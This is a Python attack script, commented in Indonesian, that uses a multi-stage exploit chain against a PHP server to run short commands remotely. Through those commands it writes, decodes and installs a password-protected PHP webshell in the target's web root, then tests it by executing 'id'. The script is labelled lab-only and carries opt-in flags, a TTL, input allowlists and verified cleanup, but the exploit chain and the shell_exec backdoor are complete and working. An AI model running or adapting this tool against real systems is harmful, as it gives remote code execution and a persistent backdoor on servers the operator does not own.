#!/usr/bin/env python3
"""upshell_live.py — tanam webshell ala LIVE target (tanpa bind-mount curang).

MODE LAB SAJA — OPT-IN EKSPLISIT
  Skrip ini MENANAM WEBSHELL PERSISTEN di docroot target. Jalannya hanya
  dengan `--allow-persistent`; tanpa flag itu skrip menolak (exit != 0).
  Webshell tanpa autentikasi = backdoor terbuka yang siapa pun bisa pakai —
  itu temuan audit P1-04. RoE bounty umumnya MELARANG webshell; untuk bukti
  cukup `--proof-file` di mode exploit.

Pagar yang dipasang pada shell yang ditanam (temuan P1-04):
  - AUTENTIKASI wajib: password di-generate acak (secrets.token_urlsafe),
    di-hash bcrypt (fallback sha256+salt). `$_REQUEST['c']` HANYA dieksekusi
    bila `$_POST['k']` cocok; token kosong/salah -> HTTP 403 tanpa eksekusi.
    Password dicetak SEKALI ke stdout (tidak pernah ke file).
  - TTL: `EXPIRES = time() + ttl` ditanam di dalam shell; lewat -> 403 tanpa
    eksekusi. Default 1 jam (`--ttl-h`).
  - Nama shell divalidasi allowlist ketat (`validate_name`) — temuan P2-01:
    dulu `--name` diinterpolasi mentah ke `mv g <name>`, jadi `--name
    '../x.php'` atau `'a;id.php'` = jalur injeksi perintah.

Fakta live (semua terukur di lab 8093, bukan teori):
  - carrier perintah = 14 byte (HTDATA palsu 167 byte)
  - cwd system() = docroot (/var/www/html) — TERBUKTI via pwd>/tmp/zz2
  - docroot docker-php writable oleh www-data
  - WAJIB full-chain per perintah (leak baru tiap cmd) — leak sekali-untuk-
    semua membuahkan alamat stale (worker berganti) -> tidak pernah mengeksekusi.
    (pelajaran A/B: /tmp/zz & /tmp/zz2 tertulis hanya via full-chain per cmd)

Pipeline (masing2 cmd <=14 byte):
  - tulis b64(shell) : N x `printf C>v`        (1 char/request; v = staging)
  - dekode           : `base64 -d<v>g` (13)
  - pasang           : `mv g <name>`   (10 utk nama 6 char)
  - bersih2          : `rm v`, `rm g`
  - verifikasi POST k=<password> c=id  -> harus `uid=`
  - cleanup TERVERIFIKASI: `rm <name>` lalu POST ulang -> harus 403/404 dan
    TANPA `uid=`; kalau masih mengeksekusi, skrip TIDAK mengklaim bersih.

Shell mini (auth + TTL), dibuat oleh `build_shell_source()`:
  gate TTL -> gate password ($_POST['k']) -> baru shell_exec($_REQUEST['c']).

PAKAI DI TARGET SENDIRI / IZIN TERTULIS.
"""
from __future__ import annotations

import argparse
import base64
import hashlib
import re
import secrets
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from lib import chain as chain_mod  # noqa: E402

# Panjang maksimum perintah yang bisa diangkut carrier (terukur di lab).
CARRIER_MAX = 14

# Allowlist nama shell (temuan audit P2-01). Titik pertama wajib alnum,
# sisanya alnum/._-, ekstensi HARUS .php, total <= 32 karakter. Semua karakter
# yang berarti bagi shell atau filesystem ( / \ spasi ; | & $ ` ' " < > ( ) { }
# [ ] * ? ~ # newline tab ) TIDAK mungkin lolos karena kelas karakternya
# tertutup — bukan karena blacklist.
# CATATAN: tanpa `$` + pakai fullmatch(). `re.match(... + "$")` MASIH menerima
# "x.php\n" karena `$` cocok sebelum newline terakhir — itu lubang, bukan
# detail kosmetik: nama ber-newline langsung jadi karakter kontrol di perintah.
NAME_RE = re.compile(r"[A-Za-z0-9][A-Za-z0-9._-]{0,31}\.php")
NAME_RULE = ("nama shell wajib cocok ^[A-Za-z0-9][A-Za-z0-9._-]{0,31}\\.php$ : "
             "mulai huruf/angka, hanya huruf/angka/./_/- di tengah, akhiran "
             ".php, maksimal 32 karakter; tanpa '/', '\\\\', spasi, '..', "
             "metakarakter shell (;|&$`'\"<>(){}[]*?~#), newline, atau tab")


def validate_name(name: str) -> str:
    """Validasi nama shell; raise ValueError dengan aturan yang dilanggar.

    Mengembalikan nama apa adanya bila sah (dipakai langsung untuk
    `mv g <name>` dan `rm <name>`).
    """
    if not isinstance(name, str):
        raise ValueError(f"nama shell harus string, bukan {type(name).__name__}. {NAME_RULE}")
    if not name:
        raise ValueError(f"nama shell kosong. {NAME_RULE}")
    if len(name) > 32:
        raise ValueError(f"nama shell {len(name)} karakter, maksimal 32. {NAME_RULE}")
    if ".." in name:
        raise ValueError(f"nama shell memuat '..' (path traversal). {NAME_RULE}")
    if any(ord(c) < 0x20 or ord(c) == 0x7F for c in name):
        raise ValueError(f"nama shell memuat karakter kontrol (newline/tab/"
                         f"NUL). {NAME_RULE}")
    if not NAME_RE.fullmatch(name):
        raise ValueError(f"nama shell {name!r} ditolak. {NAME_RULE}")
    return name


# ------------------------------------------------------------------ RR-2 ---
# Bentuk perintah yang SAH di carrier 14 byte. Semua bentuk di bawah dibangun
# modul ini sendiri dari input tervalidasi; tidak ada satu pun yang menerima
# string bebas dari operator.
#
# Kenapa tidak memakai `exploit_runner.validate_command()`: perintah carrier
# memang memuat `>`, `<`, dan `rm ` — token yang sengaja dilarang di jalur
# proof-of-access. Dua jalur ini punya kebutuhan berbeda, jadi pagarnya juga
# berbeda; yang WAJIB sama adalah sifatnya: allowlist bentuk, bukan blacklist.
_CARRIER_FORMS = (
    # tulis staging: printf '<char>' >v  /  printf '<char>' >>v
    (re.compile(r"printf '([A-Za-z0-9+/=])' >>?v\Z"), "printf char ke staging 'v'"),
    # decode staging -> g
    (re.compile(r"base64 -d<v>g\Z"), "base64 -d<v>g"),
    # pasang shell: mv g <nama tervalidasi>
    (re.compile(r"mv g [A-Za-z0-9][A-Za-z0-9._-]{0,31}\.php\Z"), "mv g <nama>"),
    # bersihkan: rm v / rm g / rm <nama tervalidasi>
    (re.compile(r"rm (v|g|[A-Za-z0-9][A-Za-z0-9._-]{0,31}\.php)\Z"), "rm <artefak>"),
)


def validate_carrier_cmd(cmd: str) -> str:
    """Alasan penolakan bila `cmd` bukan bentuk carrier yang sah ('' = sah).

    Dipakai `full_chain_cmd()` sebagai satu-satunya gerbang: perintah yang
    tidak cocok salah satu `_CARRIER_FORMS` tidak pernah sampai ke target.
    Batas 14 byte tetap diperiksa (batas fisik carrier), tetapi bukan lagi
    satu-satunya penjaga.
    """
    if not isinstance(cmd, str) or not cmd:
        return "ditolak: perintah carrier kosong"
    if len(cmd.encode()) > CARRIER_MAX:
        return (f"ditolak: perintah {cmd!r} = {len(cmd.encode())} byte > "
                f"carrier {CARRIER_MAX} byte; perintah ini tidak akan sampai "
                f"ke target")
    for pattern, label in _CARRIER_FORMS:
        if pattern.fullmatch(cmd):
            return ""
    return (f"ditolak: perintah {cmd!r} bukan bentuk carrier yang diizinkan "
            f"({', '.join(label for _p, label in _CARRIER_FORMS)}) — jalur ini "
            f"hanya menjalankan langkah yang dibangun modul sendiri, bukan "
            f"string bebas")


def carrier_check(name: str) -> None:
    """Pastikan `mv g <name>` dan `rm <name>` muat di carrier 14 byte.

    Ini BUKAN aturan keamanan (allowlist di atas), melainkan batas fisik
    rantai: perintah >14 byte tidak pernah sampai ke target. Ditulis di sini
    supaya penolakannya jelas, bukan AssertionError dari full_chain_cmd.
    """
    mv = f"mv g {name}"
    rm = f"rm {name}"
    if len(mv.encode()) > CARRIER_MAX or len(rm.encode()) > CARRIER_MAX:
        raise ValueError(
            f"nama {name!r} terlalu panjang untuk carrier {CARRIER_MAX} byte "
            f"(`{mv}` = {len(mv.encode())}B, `{rm}` = {len(rm.encode())}B). "
            f"Pakai nama <= {CARRIER_MAX - len('mv g ')} karakter.")


def hash_password(password: str) -> tuple[str, str, str]:
    """(hash, mode, salt) untuk ditanam di shell.

    bcrypt bila tersedia (dependency proyek); fallback sha256+salt bila import
    gagal — tetap butuh password, hanya brute force-nya lebih murah.
    """
    try:
        import bcrypt  # type: ignore
        h = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=10)).decode()
        return h, "bcrypt", ""
    except Exception:  # noqa: BLE001 — fallback disengaja, bukan error
        salt = secrets.token_hex(8)
        h = hashlib.sha256((salt + password).encode()).hexdigest()
        return h, "sha256", salt


def _cred_expr(mode: str) -> str:
    """Ekspresi PHP pembanding kredensial — HANYA cabang yang relevan.

    Sengaja tidak memakai ternary dua cabang: string `password_verify` tidak
    perlu ikut tertanam di shell sha256 (permukaan lebih kecil, dan tes bisa
    membuktikan cabang yang benar tanpa menebak).
    """
    if mode == "bcrypt":
        return "(function_exists('password_verify') && password_verify($k, $HASH));"
    if mode == "sha256":
        return "hash_equals($HASH, hash('sha256', $SALT . $k));"
    raise ValueError(f"mode hash tidak dikenal: {mode!r}")


def build_shell_source(password_hash: str, expires_ts: int,
                       mode: str = "bcrypt", salt: str = "") -> bytes:
    """Sumber PHP shell: gate TTL -> gate password -> baru eksekusi.

    Urutannya penting: `$_REQUEST['c']` hanya dieksekusi SETELAH kedua gate
    lolos, dan setiap kegagalan menjawab 403 tanpa menyentuh shell_exec.
    Tidak ada jalur yang mengeksekusi perintah tanpa `k` yang cocok.
    """
    if mode not in ("bcrypt", "sha256"):
        raise ValueError(f"mode hash tidak dikenal: {mode!r}")
    if not isinstance(expires_ts, int) or expires_ts <= 0:
        raise ValueError(f"expires_ts harus int > 0, diberikan {expires_ts!r}")
    # Nilai yang disisipkan sudah dikontrol: hex bcrypt/sha256 + salt hex.
    src = (
        "<?php\n"
        "// lab-only shell: auth + TTL (upshell_live.py)\n"
        f"$EXPIRES = {int(expires_ts)};\n"
        f"$HASH = '{password_hash}';\n"
        f"$MODE = '{mode}';\n"
        f"$SALT = '{salt}';\n"
        "if (time() > $EXPIRES) { http_response_code(403); exit; }\n"
        "$k = isset($_POST['k']) && is_string($_POST['k']) ? $_POST['k'] : '';\n"
        "$ok = false;\n"
        "if ($k !== '') {\n"
        f"    $ok = {_cred_expr(mode)}\n"
        "}\n"
        "if (!$ok) { http_response_code(403); exit; }\n"
        "if (isset($_REQUEST['c']) && is_string($_REQUEST['c']) && $_REQUEST['c'] !== '') {\n"
        "    echo shell_exec($_REQUEST['c']);\n"
        "}\n"
    )
    return src.encode()


def http_post(url: str, data: dict, timeout: float = 8.0) -> tuple[int, str]:
    body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=body, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")[:300]
    except urllib.error.HTTPError as ex:
        return ex.code, ""
    except Exception as ex:  # noqa: BLE001
        return 0, str(ex)


def full_chain_cmd(base: str, cmd: str, profile: str = "bookworm",
                   attempts: int = 6, log=print) -> bool:
    """Eksekusi 1 perintah (<=14 byte) — leak BARU per perintah, pola run_exploit.

    RR-2 (audit round 2): jalur ini membangun perintah yang MEMANG melanggar
    `exploit_runner.FORBIDDEN_CMD_TOKENS` (`>`, `<`, `rm `), jadi tidak mungkin
    lewat `validate_command()` — dan karena itu tidak boleh menerima string
    bebas dari luar. Gerbangnya di sini: `cmd` wajib cocok salah satu BENTUK di
    `_CARRIER_FORMS`, semuanya dibangun oleh modul ini sendiri dari input yang
    sudah divalidasi (nama shell via `validate_name()`, char base64, dst).

    Tanpa gerbang ini, siapa pun yang memanggil `full_chain_cmd(base,
    "sh</out/c")` mendapat eksekusi string bebas di target — persis kelas bug
    yang ditutup R2-01 di jalur exploit, tetapi di jalur yang berbeda.
    """
    why = validate_carrier_cmd(cmd)
    if why:
        raise ValueError(why)
    for attempt in range(1, attempts + 1):
        try:
            t = chain_mod.Target(base, timeout=30.0, verbose=False)
            t.log = lambda *_: None
            ex = chain_mod.Chain(t, cmd, profile=profile, verbose=False)
            ex.rotate()
            chunk = ex.stage1()
            if not chunk:
                continue
            ex.rotate()
            libphp = ex.stage2()
            if not libphp:
                continue
            ex.rotate()
            ht = chunk + ex.htdata_offset
            zif = libphp + ex.zif_offset
            ex.stage3(ht, zif)
            time.sleep(0.7)
            log(f"     try{attempt} ht=0x{ht & 0xfff:x}+ zif=0x{zif & 0xfff:x} (ok)")
            return True
        except Exception as exc:  # noqa: BLE001
            log(f"     try{attempt}: {type(exc).__name__}: {exc}")
            time.sleep(0.5)
    return False


def http_get(url: str, timeout: float = 8.0) -> tuple[int, str]:
    try:
        with urllib.request.urlopen(url, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")[:500]
    except urllib.error.HTTPError as ex:
        return ex.code, ""
    except Exception as ex:  # noqa: BLE001
        return 0, str(ex)


def write_v_verified(base: str, b64: str, args, log=print) -> bool:
    """Tulis b64 ke staging 'v' di docroot DENGAN verifikasi via HTTP GET /v.

    stage3 kadang tak jalan / jalan dobel -> file bisa kekurangan/kelebihan
    char. Karena docroot diserve Apache, isi 'v' bisa dibaca langsung:
    kalau mismatch -> rm v lalu tulis ulang dari char pertama (fallback),
    maks 3 putaran.
    """
    import time as _t

    def run(cmd: str) -> bool:
        return full_chain_cmd(base, cmd, args.profile, log=log)

    for round_ in range(1, 5):
        run("rm v")
        ok_all = True
        for i, ch in enumerate(b64):
            # PENTING (dash): digit SEBELUM '>>' = redirect fd-N ("9 >>v" tetap
            # fd-9 walau berspasi — POSIX izinkan ws). Solusi: QUOTE karakter:
            # "printf '9' >>v" = 14 byte, semua char base64 lolos ('+/=' aman).
            cmd = f"printf '{ch}' >v" if i == 0 else f"printf '{ch}' >>v"
            # verifikasi PER CHAR: stage3 tidak deterministik (~1/12 gagal
            # dieksekusi tanpa error). Tegakkan dengan ulang char yang sama.
            for attempt in range(1, 6):
                if not run(cmd):
                    return False
                _t.sleep(0.4)
                code, cur = http_get(base + "v")
                if code == 200 and cur == b64[:i + 1]:
                    break
                log(f"     char {i + 1}/{len(b64)} ({ch!r}) coba{attempt}: "
                    f"file={len(cur)}B")
                if code == 200 and len(cur) < i + 1 and b64.startswith(cur):
                    continue  # char belum tertulis — ulang command yang sama
                # isi salah/korup -> rm dan rebuild dari awal
                run("rm v")
                return write_v_verified(base, b64, args, log=log)
            else:
                ok_all = False
                break
            if (i + 1) % 12 == 0:
                log(f"     [{i + 1}/{len(b64)}] ok")
        if ok_all:
            code, cur = http_get(base + "v")
            if code == 200 and cur == b64:
                log(f"     staging 'v' TERVERIFIKASI via HTTP ({len(b64)}/{len(b64)})")
                return True
    return False


def verify_cleanup(base: str, shell_name: str, password: str, log=print) -> bool:
    """Buktikan shell TIDAK lagi mengeksekusi: POST dengan token SAH.

    Token sah dipakai justru supaya hasilnya tak bisa disamarkan oleh 403
    autentikasi: kalau file masih ada dan masih hidup, `uid=` akan muncul.
    404 = file hilang. 403 = file masih ada tetapi TIDAK mengeksekusi (mis.
    TTL lewat) — dicatat apa adanya, bukan diklaim "terhapus".
    """
    code, body = http_post(base + shell_name, {"k": password, "c": "id"})
    leaked = "uid=" in body
    log(f"    cleanup CEK: HTTP {code}, body={body.strip()[:80]!r}")
    if leaked:
        log("    [-] MASIH MENGEKSEKUSI (uid= muncul) — cleanup GAGAL")
        return False
    if code == 404:
        log("    [+] 404 — file shell tidak ada lagi (cleanup terverifikasi)")
        return True
    if code == 403:
        log("    [~] 403 — tidak mengeksekusi, TAPI file mungkin masih ada "
            "(cek manual: rm <name> di target)")
        return True
    log(f"    [?] HTTP {code} — status cleanup TIDAK bisa dipastikan dari respons")
    return False


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(
        description="up-shell live (full-chain per cmd, verifikasi HTTP) — LAB ONLY")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("--name", default="s3.php",
                    help="nama shell di webroot (allowlist: ^[A-Za-z0-9]"
                         "[A-Za-z0-9._-]{0,31}\\.php$)")
    ap.add_argument("--profile", default="bookworm")
    ap.add_argument("--ttl-h", type=float, default=1.0,
                    help="umur shell di target, jam (default 1) — lewat -> 403")
    ap.add_argument("--allow-persistent", action="store_true",
                    help=("WAJIB: mengakui bahwa ini MENANAM webshell "
                          "persisten berpassword di target (lab only)"))
    args = ap.parse_args(argv if argv is not None else None)

    # --- Gate 0: opt-in eksplisit (temuan P1-04) -------------------------
    if not args.allow_persistent:
        print("DITOLAK: mode ini LAB-ONLY dan MENANAM WEBSHELL PERSISTEN di "
              "docroot target — kelas tindakan yang di RoE bounty umumnya "
              "dianggap backdoor (dulu bahkan tanpa autentikasi; sekarang "
              "berpassword + TTL, tetap persisten).\n"
              "  Tambahkan --allow-persistent bila Anda memang menguji target "
              "milik sendiri dengan izin tertulis.\n"
              "  Untuk bukti akses di program bounty, pakai `php2shell.py "
              "exploit --proof-file NAME` (tanpa shell persisten).",
              file=sys.stderr)
        return 2

    # --- Gate 1: nama shell (temuan P2-01) ------------------------------
    try:
        shell_name = validate_name(args.name)
        carrier_check(shell_name)
    except ValueError as exc:
        print(f"DITOLAK: {exc}", file=sys.stderr)
        return 2

    if not (args.ttl_h > 0):
        print(f"DITOLAK: --ttl-h harus > 0 (diberikan {args.ttl_h})", file=sys.stderr)
        return 2

    base = args.url.rstrip("/") + "/"
    log = print
    expires_ts = int(time.time()) + int(args.ttl_h * 3600)

    # password: dicetak SEKALI ke stdout, tidak pernah ke file.
    password = secrets.token_urlsafe(18)
    pw_hash, pw_mode, pw_salt = hash_password(password)

    print(f"[0] shell: {shell_name}  TTL: {args.ttl_h} jam  "
          f"(expires={expires_ts}, auth={pw_mode})")
    print(f"    PASSWORD (sekali, salin sekarang): {password}")

    shell_src = build_shell_source(pw_hash, expires_ts, mode=pw_mode, salt=pw_salt)
    b64 = base64.b64encode(shell_src).decode()
    print(f"[1] tulis staging 'v' ({len(shell_src)}B -> {len(b64)} char, "
          f"verifikasi tiap 12 char)")
    if not write_v_verified(base, b64, args, log=log):
        print("    staging 'v' gagal terverifikasi setelah 3 putaran")
        return 1

    print("[2] dekode: base64 -d<v>g")
    if not full_chain_cmd(base, "base64 -d<v>g", args.profile, log=log):
        return 2

    print(f"[3] pasang: mv g {shell_name}")
    if not full_chain_cmd(base, f"mv g {shell_name}", args.profile, log=log):
        return 3

    print("[4] bersih-bersih staging: rm v lalu rm g")
    full_chain_cmd(base, "rm v", args.profile, log=log)
    full_chain_cmd(base, "rm g", args.profile, log=log)

    print("[5] verifikasi (POST k=*** c=id, password tidak dicetak ulang)")
    code, body = http_post(base + shell_name, {"k": password, "c": "id"})
    print(f"    HTTP {code}: {body.strip()[:100]}")
    if not (code == 200 and "uid=" in body):
        print("[-] belum aktif — coba run ulang tahap [2]-[3]")
        print("    (shell TIDAK terpasang aktif; staging dibersihkan bila ada)")
        # tetap coba cleanup: file bisa ada tapi belum jalan
        full_chain_cmd(base, f"rm {shell_name}", args.profile, log=log)
        verify_cleanup(base, shell_name, password, log=log)
        return 1

    print(f"[+] SHELL AKTIF: {base}{shell_name}")
    print(f"    pakai : curl -s -d 'k=<password>' -d 'c=id' {base}{shell_name}")

    # --- Cleanup TERVERIFIKASI (selalu: sukses maupun gagal) ------------
    print(f"[6] cleanup: rm {shell_name} lewat full-chain")
    if not full_chain_cmd(base, f"rm {shell_name}", args.profile, log=log):
        print("    [!] perintah rm gagal diangkut carrier — VERIFIKASI di bawah "
              "yang menentukan")
    ok_removed = verify_cleanup(base, shell_name, password, log=log)
    if not ok_removed:
        print("[!] CLEANUP BELUM TERVERIFIKASI — webshell mungkin masih hidup. "
              "Hapus manual: " + f"rm {shell_name} (docroot target).")
        return 4
    print("[+] cleanup terverifikasi: shell tidak lagi mengeksekusi.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
